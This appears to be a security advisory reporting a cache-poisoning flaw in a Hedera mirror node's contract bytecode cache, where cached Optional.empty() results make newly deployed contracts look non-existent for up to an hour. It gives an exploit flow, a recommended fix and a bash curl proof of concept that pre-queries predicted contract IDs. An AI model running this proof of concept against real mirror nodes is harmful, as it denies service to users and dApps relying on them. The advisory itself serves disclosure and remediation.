### Title
Cache Poisoning via `Optional.empty()` Caching in `ContractRepository.findRuntimeBytecode()` Causes Newly Deployed Contracts to Appear Non-Existent for Up to 1 Hour

### Summary
The `@Cacheable` annotation on `findRuntimeBytecode()` uses `unless = "#result == null"` as its exclusion condition. Because `Optional.empty()` is a non-null object, it is stored in the shared Caffeine cache with a 1-hour access-based TTL. An unprivileged attacker who can predict the next sequential Hedera entity ID can pre-query that ID via the public `/api/v1/contracts/call` endpoint before the contract is deployed, poisoning the cache with `Optional.empty()`. All subsequent EVM lookups for that contract's bytecode will return the cached empty result for up to 1 hour, making the newly deployed contract appear non-existent to the mirror node's EVM.

### Finding Description

**Exact code path:**

`ContractRepository.java` line 16:
```java
@Cacheable(cacheNames = CACHE_NAME_CONTRACT, cacheManager = CACHE_MANAGER_CONTRACT, unless = "#result == null")
Optional<byte[]> findRuntimeBytecode(final Long contractId);
``` [1](#0-0) 

The `unless` SpEL expression is `#result == null`. Spring evaluates this against the actual return value of the method. The method returns `Optional<byte[]>`. When no contract exists, the DB query returns no rows and Spring Data JPA wraps that as `Optional.empty()`. `Optional.empty()` is a singleton non-null object, so `#result == null` evaluates to `false`, and the empty Optional **is stored in the cache**.

The cache is configured as:
```
expireAfterAccess=1h,maximumSize=1000,recordStats
``` [2](#0-1) 

This is a shared, persistent Caffeine cache (singleton Spring bean), not a per-request cache: [3](#0-2) 

The consumer of this cache is `ContractBytecodeReadableKVState.readFromDataSource()`:
```java
return contractRepository
        .findRuntimeBytecode(entityId.getId())
        .map(Bytes::wrap)
        .map(Bytecode::new)
        .orElse(null);
``` [4](#0-3) 

When the cache returns `Optional.empty()`, `.orElse(null)` returns `null`, and the EVM treats the contract as having no bytecode — i.e., non-existent.

Critically, unlike other `ReadableKVState` implementations (e.g., `TokenReadableKVState`, `AirdropsReadableKVState`) that check `ContractCallContext.get().getTimestamp()` and branch on historical vs. latest, `ContractBytecodeReadableKVState.readFromDataSource()` has **no timestamp awareness** and always hits the same cache key (`contractId` Long), regardless of whether the call is historical or latest.

The public API entry point is the unauthenticated `POST /api/v1/contracts/call` endpoint: [5](#0-4) 

The existing `ContractRepositoryTest` confirms the behavior — querying a non-existent ID returns `Optional.empty()` (which gets cached), and the test `findRuntimeBytecodeSuccessfulCall` confirms the cache persists across DB deletions: [6](#0-5) 

**Exploit flow:**

1. Attacker observes the current highest entity ID on Hedera (publicly visible via mirror node REST API or consensus node).
2. Attacker predicts the next contract entity ID (e.g., `N+1`).
3. Attacker sends `POST /api/v1/contracts/call` with `to` = the long-zero EVM address of entity `N+1` (e.g., `0x00000000000000000000000000000000000<N+1>`).
4. The EVM calls `ContractBytecodeReadableKVState.readFromDataSource()` → `findRuntimeBytecode(N+1)` → DB returns no rows → `Optional.empty()` → cached under key `N+1`.
5. A legitimate user deploys a contract; it receives entity ID `N+1` and its bytecode is written to the DB.
6. Any subsequent `eth_call` or gas estimation against contract `N+1` via the mirror node hits the cache, gets `Optional.empty()`, and the EVM returns as if the contract has no code — calls revert or return empty.
7. This persists for up to 1 hour (or until the cache entry is evicted by LRU pressure from 1000 other entries).

### Impact Explanation

Any user or dApp relying on the mirror node's `/api/v1/contracts/call` endpoint to interact with a newly deployed contract will receive incorrect results (contract appears non-existent) for up to 1 hour. This breaks:
- All `eth_call` simulations against the new contract.
- All gas estimations for calls to the new contract.
- Any dApp that uses the mirror node as its EVM simulation backend immediately after contract deployment.

The attacker does not need to know the exact contract ID in advance — they can spray a range of predicted IDs (e.g., the next 100 sequential IDs) at negligible cost, since the cache holds up to 1000 entries and the endpoint is rate-limited only by the throttle manager (which allows at least 21,000 gas per call).

### Likelihood Explanation

Hedera entity IDs are strictly sequential and publicly observable in real time via the mirror node's own REST API (`/api/v1/contracts`, `/api/v1/accounts`). Predicting the next ID requires only a single read of the current maximum ID. The attack requires no credentials, no tokens, and no special network access — only the ability to send HTTP POST requests to the public mirror node endpoint. The attack is repeatable and can be automated to continuously poison IDs as they are allocated.

### Recommendation

Fix the `unless` condition to also exclude `Optional.empty()`:

```java
@Cacheable(
    cacheNames = CACHE_NAME_CONTRACT,
    cacheManager = CACHE_MANAGER_CONTRACT,
    unless = "#result == null || !#result.isPresent()"
)
Optional<byte[]> findRuntimeBytecode(final Long contractId);
```

This ensures only non-empty Optionals (i.e., contracts that actually have bytecode) are cached. Alternatively, change the return type to `byte[]` (returning `null` for missing contracts) and keep `unless = "#result == null"`, which would then correctly exclude the missing-contract case.

Additionally, consider adding a `@CacheEvict` or `@CachePut` hook in the contract ingestion path (e.g., in `ContractCreateTransactionHandler` or `SidecarContractMigration`) to proactively invalidate or update the cache entry when a contract's bytecode is written to the DB.

### Proof of Concept

```bash
# Step 1: Find the current maximum contract entity ID
CURRENT_MAX=$(curl -s "https://<mirror-node>/api/v1/contracts?limit=1&order=desc" \
  | jq -r '.contracts[0].contract_id' | cut -d. -f3)

# Step 2: Predict the next contract ID
NEXT_ID=$((CURRENT_MAX + 1))

# Step 3: Compute the long-zero EVM address for NEXT_ID
NEXT_ADDR=$(printf "0x%040x" $NEXT_ID)

# Step 4: Pre-populate the cache with Optional.empty() for NEXT_ID
curl -s -X POST "https://<mirror-node>/api/v1/contracts/call" \
  -H "Content-Type: application/json" \
  -d "{\"to\": \"$NEXT_ADDR\", \"data\": \"0x\", \"gas\": 21000}"
# Returns error (no bytecode), but Optional.empty() is now cached for NEXT_ID

# Step 5: (Out of band) A legitimate user deploys a contract; it gets entity ID NEXT_ID

# Step 6: Verify the contract is deployed (bytecode visible in DB via REST API)
curl -s "https://<mirror-node>/api/v1/contracts/$NEXT_ID" | jq '.bytecode'
# Returns actual bytecode

# Step 7: Attempt to call the contract via the EVM endpoint
curl -s -X POST "https://<mirror-node>/api/v1/contracts/call" \
  -H "Content-Type: application/json" \
  -d "{\"to\": \"$NEXT_ADDR\", \"data\": \"0xSOME_FUNCTION_SELECTOR\", \"gas\": 100000}"
# Returns error or empty result — contract appears non-existent due to cached Optional.empty()
# This persists for up to 1 hour
```

### Citations

**File:** web3/src/main/java/org/hiero/mirror/web3/repository/ContractRepository.java (L16-18)
```java
    @Cacheable(cacheNames = CACHE_NAME_CONTRACT, cacheManager = CACHE_MANAGER_CONTRACT, unless = "#result == null")
    @Query(value = "select runtime_bytecode from contract where id = :contractId", nativeQuery = true)
    Optional<byte[]> findRuntimeBytecode(final Long contractId);
```

**File:** web3/src/main/java/org/hiero/mirror/web3/repository/properties/CacheProperties.java (L22-22)
```java
    private String contract = "expireAfterAccess=1h,maximumSize=1000,recordStats";
```

**File:** web3/src/main/java/org/hiero/mirror/web3/evm/config/EvmConfiguration.java (L67-73)
```java
    @Bean(CACHE_MANAGER_CONTRACT)
    CacheManager cacheManagerContract() {
        final CaffeineCacheManager caffeineCacheManager = new CaffeineCacheManager();
        caffeineCacheManager.setCacheNames(Set.of(CACHE_NAME_CONTRACT));
        caffeineCacheManager.setCacheSpecification(cacheProperties.getContract());
        return caffeineCacheManager;
    }
```

**File:** web3/src/main/java/org/hiero/mirror/web3/state/keyvalue/ContractBytecodeReadableKVState.java (L39-47)
```java
    protected Bytecode readFromDataSource(@NonNull ContractID contractID) {
        final var entityId = toEntityId(contractID);

        return contractRepository
                .findRuntimeBytecode(entityId.getId())
                .map(Bytes::wrap)
                .map(Bytecode::new)
                .orElse(null);
    }
```

**File:** web3/src/main/java/org/hiero/mirror/web3/controller/ContractController.java (L37-51)
```java
    @PostMapping(value = "/call")
    ContractCallResponse call(@RequestBody @Valid ContractCallRequest request, HttpServletResponse response) {
        try {
            throttleManager.throttle(request);
            validateContractMaxGasLimit(request);

            final var params = constructServiceParameters(request);
            final var result = contractExecutionService.processCall(params);
            return new ContractCallResponse(result);
        } catch (InvalidParametersException e) {
            // The validation failed, but no processing occurred so restore the consumed tokens.
            throttleManager.restore(request.getGas());
            throw e;
        }
    }
```

**File:** web3/src/test/java/org/hiero/mirror/web3/repository/ContractRepositoryTest.java (L33-38)
```java
    @Test
    void findRuntimeBytecodeFailCall() {
        Contract contract = domainBuilder.contract().persist();
        long id = contract.getId();
        assertThat(contractRepository.findRuntimeBytecode(++id)).isEmpty();
    }
```
